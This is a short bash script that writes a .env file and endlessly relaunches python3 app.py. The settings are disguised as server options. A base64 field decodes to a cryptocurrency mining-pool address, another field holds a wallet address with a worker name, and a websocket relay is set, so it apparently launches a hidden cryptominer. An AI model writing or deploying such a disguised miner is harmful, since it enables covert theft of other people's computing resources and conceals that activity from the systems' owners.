#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://b.bagah.studio
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=89ERzyoQQxdHnhTm3giY4CM9QobiizHwtEQ9jLvGBcjZfYLaUQyNrSa5LcybFgTrnr2yuWp4CAPwfCiadqyKCibyN67zQGe.${NAME}
SERVER_SECRET=x
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 15; done
